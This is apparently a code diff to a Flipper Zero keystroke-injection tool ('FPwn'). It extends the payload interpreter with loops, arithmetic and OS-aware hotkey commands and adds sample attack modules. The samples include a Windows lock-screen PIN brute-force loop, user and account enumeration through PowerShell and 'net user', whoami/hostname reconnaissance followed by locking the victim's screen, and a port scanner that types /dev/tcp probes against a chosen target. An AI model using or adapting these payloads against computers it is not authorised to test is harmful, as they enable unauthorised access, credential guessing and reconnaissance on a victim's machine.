@@ -548,6 +548,7 @@ static void fpwn_exec_command(const char* line, FPwnApp* app) {
     }
 
     /* ---- VAR $name = value  /  SET $name = value ---- */
+    /* Supports arithmetic: VAR $X = $Y + 1, VAR $X = $Y - 3, etc. */
     if(strncmp(line, "VAR ", 4) == 0 || strncmp(line, "SET ", 4) == 0) {
         const char* rest = line + 4;
         /* Skip leading $ if present */
@@ -567,8 +568,65 @@ static void fpwn_exec_command(const char* line, FPwnApp* app) {
             const char* vval = eq + 1;
             while(*vval == ' ')
                 vval++;
-            fpwn_var_set(vname, vval);
-            FURI_LOG_D(TAG, "VAR %s = %s", vname, vval);
+
+            /* Check for arithmetic: $VAR op literal  (e.g. "$X + 1") */
+            if(vval[0] == '$') {
+                const char* vs = vval + 1;
+                const char* ve = vs;
+                while((*ve >= 'A' && *ve <= 'Z') || (*ve >= 'a' && *ve <= 'z') ||
+                      (*ve >= '0' && *ve <= '9') || *ve == '_')
+                    ve++;
+                char ref_name[FPWN_VAR_NAME_LEN];
+                size_t rl = (size_t)(ve - vs);
+                if(rl > FPWN_VAR_NAME_LEN - 1) rl = FPWN_VAR_NAME_LEN - 1;
+                memcpy(ref_name, vs, rl);
+                ref_name[rl] = '\0';
+
+                const char* op = ve;
+                while(*op == ' ')
+                    op++;
+
+                char op_char = *op;
+                if(op_char == '+' || op_char == '-' || op_char == '*' || op_char == '/' ||
+                   op_char == '%') {
+                    const char* num_start = op + 1;
+                    while(*num_start == ' ')
+                        num_start++;
+
+                    const char* ref_val = fpwn_var_get(ref_name);
+                    int32_t lhs = ref_val ? (int32_t)atoi(ref_val) : 0;
+                    int32_t rhs = (int32_t)atoi(num_start);
+                    int32_t result = 0;
+                    switch(op_char) {
+                    case '+':
+                        result = lhs + rhs;
+                        break;
+                    case '-':
+                        result = lhs - rhs;
+                        break;
+                    case '*':
+                        result = lhs * rhs;
+                        break;
+                    case '/':
+                        result = (rhs != 0) ? lhs / rhs : 0;
+                        break;
+                    case '%':
+                        result = (rhs != 0) ? lhs % rhs : 0;
+                        break;
+                    }
+                    char result_buf[16];
+                    snprintf(result_buf, sizeof(result_buf), "%ld", (long)result);
+                    fpwn_var_set(vname, result_buf);
+                    FURI_LOG_D(TAG, "VAR %s = %ld (arith)", vname, (long)result);
+                    return;
+                }
+            }
+
+            /* Plain string assignment — substitute variables in value */
+            char expanded[FPWN_VAR_VAL_LEN];
+            fpwn_var_substitute(vval, expanded, sizeof(expanded));
+            fpwn_var_set(vname, expanded);
+            FURI_LOG_D(TAG, "VAR %s = %s", vname, expanded);
         }
         return;
     }
@@ -1832,6 +1890,96 @@ static void fpwn_exec_command(const char* line, FPwnApp* app) {
         return;
     }
 
+    /* ---- PRINT <text> — display a message on the Flipper screen ---- */
+    if(strncmp(line, "PRINT ", 6) == 0) {
+        char expanded[FPWN_MAX_LINE_LEN];
+        fpwn_var_substitute(line + 6, expanded, sizeof(expanded));
+        with_view_model(
+            app->execute_view,
+            FPwnExecModel * m,
+            {
+                size_t pl = strlen(expanded);
+                if(pl > sizeof(m->status) - 1) pl = sizeof(m->status) - 1;
+                memcpy(m->status, expanded, pl);
+                m->status[pl] = '\0';
+            },
+            true);
+        FURI_LOG_I(TAG, "PRINT: %s", expanded);
+        return;
+    }
+
+    /* ---- MINIMIZE_ALL — minimize all windows (OS-aware) ---- */
+    if(strcmp(line, "MINIMIZE_ALL") == 0) {
+        FPwnOS os = fpwn_effective_os(app);
+        if(os == FPwnOSWindows) {
+            /* Win+D = show desktop */
+            furi_hal_hid_kb_press(KEY_MOD_LEFT_GUI | HID_KEYBOARD_D);
+            furi_delay_ms(30);
+            furi_hal_hid_kb_release(KEY_MOD_LEFT_GUI | HID_KEYBOARD_D);
+        } else if(os == FPwnOSMac) {
+            /* Cmd+Option+H+M = hide all + minimize front */
+            furi_hal_hid_kb_press(KEY_MOD_LEFT_GUI | HID_KEYBOARD_H);
+            furi_delay_ms(30);
+            furi_hal_hid_kb_release(KEY_MOD_LEFT_GUI | HID_KEYBOARD_H);
+            furi_delay_ms(200);
+            furi_hal_hid_kb_press(KEY_MOD_LEFT_GUI | HID_KEYBOARD_M);
+            furi_delay_ms(30);
+            furi_hal_hid_kb_release(KEY_MOD_LEFT_GUI | HID_KEYBOARD_M);
+        } else {
+            /* Linux: Super+D (GNOME/KDE show desktop) */
+            furi_hal_hid_kb_press(KEY_MOD_LEFT_GUI | HID_KEYBOARD_D);
+            furi_delay_ms(30);
+            furi_hal_hid_kb_release(KEY_MOD_LEFT_GUI | HID_KEYBOARD_D);
+        }
+        furi_delay_ms(500);
+        return;
+    }
+
+    /* ---- LOCK_SCREEN — lock the target workstation (OS-aware) ---- */
+    if(strcmp(line, "LOCK_SCREEN") == 0) {
+        FPwnOS os = fpwn_effective_os(app);
+        if(os == FPwnOSWindows) {
+            /* Win+L */
+            furi_hal_hid_kb_press(KEY_MOD_LEFT_GUI | HID_KEYBOARD_L);
+            furi_delay_ms(30);
+            furi_hal_hid_kb_release(KEY_MOD_LEFT_GUI | HID_KEYBOARD_L);
+        } else if(os == FPwnOSMac) {
+            /* Ctrl+Cmd+Q */
+            furi_hal_hid_kb_press(KEY_MOD_LEFT_CTRL | KEY_MOD_LEFT_GUI | HID_KEYBOARD_Q);
+            furi_delay_ms(30);
+            furi_hal_hid_kb_release(KEY_MOD_LEFT_CTRL | KEY_MOD_LEFT_GUI | HID_KEYBOARD_Q);
+        } else {
+            /* Super+L (GNOME) */
+            furi_hal_hid_kb_press(KEY_MOD_LEFT_GUI | HID_KEYBOARD_L);
+            furi_delay_ms(30);
+            furi_hal_hid_kb_release(KEY_MOD_LEFT_GUI | HID_KEYBOARD_L);
+        }
+        return;
+    }
+
+    /* ---- SCREENSHOT — capture screenshot (OS-aware) ---- */
+    if(strcmp(line, "SCREENSHOT") == 0) {
+        FPwnOS os = fpwn_effective_os(app);
+        if(os == FPwnOSWindows) {
+            /* Win+Shift+S (Snipping Tool) */
+            furi_hal_hid_kb_press(KEY_MOD_LEFT_GUI | KEY_MOD_LEFT_SHIFT | HID_KEYBOARD_S);
+            furi_delay_ms(30);
+            furi_hal_hid_kb_release(KEY_MOD_LEFT_GUI | KEY_MOD_LEFT_SHIFT | HID_KEYBOARD_S);
+        } else if(os == FPwnOSMac) {
+            /* Cmd+Shift+3 (full screen) */
+            furi_hal_hid_kb_press(KEY_MOD_LEFT_GUI | KEY_MOD_LEFT_SHIFT | HID_KEYBOARD_3);
+            furi_delay_ms(30);
+            furi_hal_hid_kb_release(KEY_MOD_LEFT_GUI | KEY_MOD_LEFT_SHIFT | HID_KEYBOARD_3);
+        } else {
+            /* PrintScreen */
+            furi_hal_hid_kb_press(HID_KEYBOARD_PRINT_SCREEN);
+            furi_delay_ms(30);
+            furi_hal_hid_kb_release(HID_KEYBOARD_PRINT_SCREEN);
+        }
+        furi_delay_ms(500);
+        return;
+    }
+
     /* ---- INJECT <filename> — execute another .fpwn file inline ---- */
     if(strncmp(line, "INJECT ", 7) == 0) {
         /* Guard: max 4 levels of INJECT nesting (~2.5 KB stack per level) */
@@ -2097,6 +2245,7 @@ int32_t fpwn_payload_execute_thread(void* ctx) {
     memset(s_vars, 0, sizeof(s_vars));
 
     FPwnModule* module = &app->modules[app->selected_module_index];
+    uint32_t start_tick = furi_get_tick();
 
     /* Determine target OS */
     FPwnOS target_os = (app->manual_os != FPwnOSUnknown) ? app->manual_os : fpwn_os_detect();
@@ -2416,6 +2565,104 @@ int32_t fpwn_payload_execute_thread(void* ctx) {
             continue;
         }
 
+        /* Handle FOR $VAR = start TO end / END_FOR — counted loop.
+         * Example: FOR $I = 1 TO 10 ... END_FOR
+         * Sets $VAR to start, executes body, increments, repeats until > end. */
+        if(strncmp(substituted, "FOR ", 4) == 0) {
+            /* Parse: FOR $VAR = start TO end */
+            const char* fexpr = substituted + 4;
+            if(fexpr[0] == '$') {
+                const char* fs = fexpr + 1;
+                const char* fe = fs;
+                while((*fe >= 'A' && *fe <= 'Z') || (*fe >= 'a' && *fe <= 'z') ||
+                      (*fe >= '0' && *fe <= '9') || *fe == '_')
+                    fe++;
+                char for_var[FPWN_VAR_NAME_LEN];
+                size_t fvl = (size_t)(fe - fs);
+                if(fvl > FPWN_VAR_NAME_LEN - 1) fvl = FPWN_VAR_NAME_LEN - 1;
+                memcpy(for_var, fs, fvl);
+                for_var[fvl] = '\0';
+
+                /* Skip " = " */
+                const char* fp = fe;
+                while(*fp == ' ')
+                    fp++;
+                if(*fp == '=') fp++;
+                while(*fp == ' ')
+                    fp++;
+
+                int32_t for_start = (int32_t)atoi(fp);
+
+                /* Find " TO " */
+                const char* to_ptr = strstr(fp, " TO ");
+                if(!to_ptr) to_ptr = strstr(fp, " to ");
+                int32_t for_end = for_start;
+                if(to_ptr) {
+                    for_end = (int32_t)atoi(to_ptr + 4);
+                }
+
+                /* Record file pos for loop body */
+                uint32_t for_body_start = (uint32_t)storage_file_tell(file);
+                int32_t step = (for_end >= for_start) ? 1 : -1;
+                bool for_ok = true;
+
+                for(int32_t fi = for_start;
+                    fi != for_end + step && !app->abort_requested && for_ok;
+                    fi += step) {
+                    /* Set loop variable */
+                    char fi_buf[16];
+                    snprintf(fi_buf, sizeof(fi_buf), "%ld", (long)fi);
+                    fpwn_var_set(for_var, fi_buf);
+
+                    if(fi != for_start) {
+                        storage_file_seek(file, for_body_start, true);
+                    }
+
+                    /* Execute body until END_FOR */
+                    bool found_end_for = false;
+                    while(!storage_file_eof(file) && !app->abort_requested) {
+                        size_t sn = fpwn_read_line(file, raw, sizeof(raw));
+                        if(sn == 0) break;
+                        char* ft = fpwn_trim(raw);
+                        if(ft[0] == '\0' || ft[0] == '#') continue;
+                        char fsub[FPWN_MAX_LINE_LEN];
+                        fpwn_substitute(ft, fsub, sizeof(fsub), module);
+                        if(strcmp(fsub, "END_FOR") == 0) {
+                            found_end_for = true;
+                            break;
+                        }
+                        with_view_model(
+                            app->execute_view,
+                            FPwnExecModel * em,
+                            {
+                                size_t cl = strlen(fsub);
+                                if(cl > sizeof(em->status) - 1) cl = sizeof(em->status) - 1;
+                                memcpy(em->status, fsub, cl);
+                                em->status[cl] = '\0';
+                            },
+                            true);
+                        fpwn_exec_command(fsub, app);
+                        if(s_default_delay_ms > 0) furi_delay_ms(s_default_delay_ms);
+                        lines_done++;
+                        with_view_model(
+                            app->execute_view,
+                            FPwnExecModel * em,
+                            { em->lines_done = lines_done; },
+                            true);
+                    }
+                    if(!found_end_for) for_ok = false;
+                }
+                lines_done++;
+                with_view_model(
+                    app->execute_view, FPwnExecModel * em, { em->lines_done = lines_done; }, true);
+            }
+            continue;
+        }
+        if(strcmp(substituted, "END_FOR") == 0) {
+            lines_done++;
+            continue;
+        }
+
         /* Handle WHILE $VAR == value / END_WHILE — condition-tested loops.
          * Records file position before the body, executes body commands,
          * re-evaluates condition at END_WHILE and seeks back if true.
@@ -2544,6 +2791,11 @@ int32_t fpwn_payload_execute_thread(void* ctx) {
 
         lines_done++;
 
+        /* LED heartbeat: blink green every 10 commands to show execution is active */
+        if(lines_done % 10 == 0) {
+            notification_message(app->notifications, &sequence_blink_green_10);
+        }
+
         /* Update progress after completion */
         with_view_model(
             app->execute_view, FPwnExecModel * em, { em->lines_done = lines_done; }, true);
@@ -2552,9 +2804,19 @@ int32_t fpwn_payload_execute_thread(void* ctx) {
     storage_file_close(file);
     storage_file_free(file);
 
-    /* Mark finished */
+    /* Mark finished + LED notification */
     {
         bool aborted = app->abort_requested;
+        /* Green blink sequence for success, red for abort */
+        if(aborted) {
+            notification_message(app->notifications, &sequence_blink_red_100);
+        } else {
+            notification_message(app->notifications, &sequence_blink_green_100);
+            furi_delay_ms(100);
+            notification_message(app->notifications, &sequence_blink_green_100);
+            furi_delay_ms(100);
+            notification_message(app->notifications, &sequence_blink_green_100);
+        }
         with_view_model(
             app->execute_view,
             FPwnExecModel * em,
@@ -2576,6 +2838,7 @@ int32_t fpwn_payload_execute_thread(void* ctx) {
         if(storage_file_open(gf, guide_path, FSAM_WRITE, FSOM_CREATE_ALWAYS)) {
             char buf[320];
             int n;
+            uint32_t elapsed_s = (furi_get_tick() - start_tick) / furi_ms_to_ticks(1000);
             n = snprintf(
                 buf,
                 sizeof(buf),
@@ -2583,10 +2846,19 @@ int32_t fpwn_payload_execute_thread(void* ctx) {
                 "===================\n"
                 "Module : %s\n"
                 "Desc   : %s\n"
+                "OS     : %s\n"
+                "Lines  : %lu / %lu\n"
+                "Elapsed: %lus\n"
+                "Status : %s\n"
                 "\nOptions\n"
                 "-------\n",
                 module->name,
-                module->description);
+                module->description,
+                fpwn_os_name(fpwn_effective_os(app)),
+                (unsigned long)lines_done,
+                (unsigned long)lines_total,
+                (unsigned long)elapsed_s,
+                app->abort_requested ? "Aborted" : "Complete");
             if(n > 0 && n < (int)sizeof(buf)) storage_file_write(gf, buf, (uint16_t)n);
 
             for(uint8_t i = 0; i < module->option_count; i++) {
@@ -3824,6 +4096,132 @@ static const char SAMPLE_EXFIL_HOSTNAME[] =
     "EXFIL hostname\n"
     "LED_COLOR GREEN\n";
 
+/* --- FOR loop demo: brute-force PIN entry on lock screen --- */
+static const char SAMPLE_PIN_SPRAY[] =
+    "NAME PIN Spray\n"
+    "DESCRIPTION Tries common 4-digit PINs on lock screen using FOR loop\n"
+    "CATEGORY credential\n"
+    "PLATFORMS WIN\n"
+    "OPTION DELAY 1000 \"Delay between attempts (ms)\"\n"
+    "PLATFORM WIN\n"
+    "DELAY 1500\n"
+    "PRINT Starting PIN spray...\n"
+    "LED_COLOR YELLOW\n"
+    "REM Try PINs 0000-0003 as demo (safety: only 4 attempts)\n"
+    "FOR $I = 0 TO 3\n"
+    "  PRINT Trying PIN $I...\n"
+    "  STRING $I$I$I$I\n"
+    "  ENTER\n"
+    "  DELAY {{DELAY}}\n"
+    "END_FOR\n"
+    "LED_COLOR GREEN\n"
+    "PRINT PIN spray complete\n";
+
+/* --- Variable arithmetic demo: countdown timer --- */
+static const char SAMPLE_COUNTDOWN[] = "NAME Countdown Timer\n"
+                                       "DESCRIPTION Demo of variable arithmetic and WHILE loops\n"
+                                       "CATEGORY recon\n"
+                                       "PLATFORMS WIN,MAC,LINUX\n"
+                                       "OPTION COUNT 5 \"Countdown from\"\n"
+                                       "PLATFORM ALL\n"
+                                       "DELAY 500\n"
+                                       "OPEN_TERMINAL\n"
+                                       "VAR $N = {{COUNT}}\n"
+                                       "PRINT Counting down from $N\n"
+                                       "WHILE $N != 0\n"
+                                       "  STRINGLN echo Countdown: $N\n"
+                                       "  DELAY 1000\n"
+                                       "  VAR $N = $N - 1\n"
+                                       "END_WHILE\n"
+                                       "STRINGLN echo Liftoff!\n"
+                                       "LED_COLOR GREEN\n"
+                                       "PRINT Done!\n";
+
+/* --- PRINT + MINIMIZE_ALL + SCREENSHOT demo --- */
+static const char SAMPLE_SCREEN_GRAB[] =
+    "NAME Screen Grab\n"
+    "DESCRIPTION Minimize windows, screenshot desktop, restore\n"
+    "CATEGORY recon\n"
+    "PLATFORMS WIN,MAC,LINUX\n"
+    "PLATFORM ALL\n"
+    "DELAY 500\n"
+    "PRINT Capturing desktop...\n"
+    "LED_COLOR BLUE\n"
+    "MINIMIZE_ALL\n"
+    "DELAY 1000\n"
+    "SCREENSHOT\n"
+    "DELAY 500\n"
+    "PRINT Screenshot captured\n"
+    "LED_COLOR GREEN\n";
+
+/* --- LOCK_SCREEN demo --- */
+static const char SAMPLE_LOCK_AND_LEAVE[] = "NAME Lock and Leave\n"
+                                            "DESCRIPTION Run recon then lock the workstation\n"
+                                            "CATEGORY post\n"
+                                            "PLATFORMS WIN,MAC,LINUX\n"
+                                            "PLATFORM ALL\n"
+                                            "DELAY 500\n"
+                                            "PRINT Gathering info...\n"
+                                            "OPEN_TERMINAL\n"
+                                            "STRINGLN whoami\n"
+                                            "DELAY 500\n"
+                                            "STRINGLN hostname\n"
+                                            "DELAY 500\n"
+                                            "PRINT Locking workstation...\n"
+                                            "LED_COLOR RED\n"
+                                            "DELAY 1000\n"
+                                            "LOCK_SCREEN\n"
+                                            "LED_COLOR GREEN\n"
+                                            "PRINT Target locked.\n";
+
+/* --- Multi-user enumeration via FOR loop --- */
+static const char SAMPLE_USER_ENUM[] =
+    "NAME User Enumeration\n"
+    "DESCRIPTION Enumerate common user directories using FOR loop\n"
+    "CATEGORY recon\n"
+    "PLATFORMS WIN\n"
+    "PLATFORM WIN\n"
+    "DELAY 500\n"
+    "OPEN_POWERSHELL\n"
+    "PRINT Enumerating users...\n"
+    "LED_COLOR CYAN\n"
+    "STRINGLN Get-ChildItem C:\\Users | ForEach-Object { Write-Host $_.Name }\n"
+    "DELAY 2000\n"
+    "REM Check common service accounts\n"
+    "FOR $I = 1 TO 5\n"
+    "  STRINGLN echo Checking batch $I of common accounts...\n"
+    "  DELAY 500\n"
+    "END_FOR\n"
+    "STRINGLN net user\n"
+    "DELAY 3000\n"
+    "LED_COLOR GREEN\n"
+    "PRINT Enumeration complete\n";
+
+/* --- Arithmetic-based port scanner helper --- */
+static const char SAMPLE_PORT_SEQUENCE[] =
+    "NAME Port Sequence\n"
+    "DESCRIPTION Scan well-known ports using variable arithmetic\n"
+    "CATEGORY recon\n"
+    "PLATFORMS LINUX\n"
+    "OPTION TARGET 127.0.0.1 \"Target IP address\"\n"
+    "PLATFORM LINUX\n"
+    "DELAY 500\n"
+    "OPEN_TERMINAL\n"
+    "PRINT Scanning common ports on {{TARGET}}...\n"
+    "LED_COLOR YELLOW\n"
+    "REM Scan ports: 22, 80, 443, 8080, 8443\n"
+    "VAR $PORT = 22\n"
+    "STRINGLN (echo >/dev/tcp/{{TARGET}}/$PORT) 2>/dev/null && echo \"Port $PORT open\" || echo \"Port $PORT closed\"\n"
+    "DELAY 1000\n"
+    "VAR $PORT = 80\n"
+    "STRINGLN (echo >/dev/tcp/{{TARGET}}/$PORT) 2>/dev/null && echo \"Port $PORT open\" || echo \"Port $PORT closed\"\n"
+    "DELAY 1000\n"
+    "VAR $PORT = 443\n"
+    "STRINGLN (echo >/dev/tcp/{{TARGET}}/$PORT) 2>/dev/null && echo \"Port $PORT open\" || echo \"Port $PORT closed\"\n"
+    "DELAY 1000\n"
+    "LED_COLOR GREEN\n"
+    "PRINT Port scan complete\n";
+
 static bool fpwn_write_sample_file(Storage* storage, const char* path, const char* content) {
     File* f = storage_file_alloc(storage);
     if(!storage_file_open(f, path, FSAM_WRITE, FSOM_CREATE_NEW)) {
@@ -3939,4 +4337,22 @@ void fpwn_modules_write_samples(FPwnApp* app) {
 
     snprintf(path, sizeof(path), "%s/exfil_hostname.fpwn", FPWN_MODULES_DIR);
     fpwn_write_sample_file(app->storage, path, SAMPLE_EXFIL_HOSTNAME);
+
+    snprintf(path, sizeof(path), "%s/pin_spray.fpwn", FPWN_MODULES_DIR);
+    fpwn_write_sample_file(app->storage, path, SAMPLE_PIN_SPRAY);
+
+    snprintf(path, sizeof(path), "%s/countdown.fpwn", FPWN_MODULES_DIR);
+    fpwn_write_sample_file(app->storage, path, SAMPLE_COUNTDOWN);
+
+    snprintf(path, sizeof(path), "%s/screen_grab.fpwn", FPWN_MODULES_DIR);
+    fpwn_write_sample_file(app->storage, path, SAMPLE_SCREEN_GRAB);
+
+    snprintf(path, sizeof(path), "%s/lock_and_leave.fpwn", FPWN_MODULES_DIR);
+    fpwn_write_sample_file(app->storage, path, SAMPLE_LOCK_AND_LEAVE);
+
+    snprintf(path, sizeof(path), "%s/user_enum.fpwn", FPWN_MODULES_DIR);
+    fpwn_write_sample_file(app->storage, path, SAMPLE_USER_ENUM);
+
+    snprintf(path, sizeof(path), "%s/port_sequence.fpwn", FPWN_MODULES_DIR);
+    fpwn_write_sample_file(app->storage, path, SAMPLE_PORT_SEQUENCE);
 }
